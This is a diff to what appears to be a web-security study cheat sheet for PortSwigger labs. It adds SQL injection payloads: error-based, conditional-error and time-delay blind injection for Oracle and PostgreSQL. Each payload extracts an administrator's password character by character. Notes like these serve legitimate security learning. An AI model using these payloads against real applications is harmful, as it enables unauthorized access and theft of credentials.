@@ -45,11 +45,22 @@ AND (SELECT 'x' FROM information_schema.tables WHERE table_name='users')='x' -- 
 AND (SELECT 'x' FROM users WHERE username='administrator')='x' -- - confirm if user exists
 AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20 -- - get password's length
 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='8' -- - bruteforce password char by char
--- Blind SQL injection with conditional errors
-OR 1=(SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator')) = 20 THEN TO_CHAR(1/0) ELSE '1' END FROM dual) -- - get password's length
+-- Blind SQL injection with conditional errors (oracle)
+AND (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL -- - confirming the error
+AND (SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- - check password length
+AND (SELECT CASE WHEN (SUBSTR(password, 1, 1)='c') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- - bruteforce password char by char
+-- Visible error-based SQL injection (postgreSQL)
+AND 1=CAST((SELECT username from users LIMIT 1) AS int) -- - get username
+AND 1=CAST((SELECT password from users LIMIT 1) AS int) -- - get password
+-- Blind SQL injection with time delays (postgreSQL)
+AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END) IS NULL -- -
+-- Blind SQL injection with time delays and information retrieval
+AND (SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- -
+AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='1') THEN pg_sleep(10) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- -
 ```
 
 - Solver for Blind SQL injection with conditional responses can be found [here](/assets/solutions/portswigger/conditional_responses.py).
+- Solver for Blind SQL injection with conditional errors can be found [here](/assets/solutions/portswigger/conditional_errors.py).
 
 ## Cross-site Scripting (XSS)
 ### Cheat Sheet
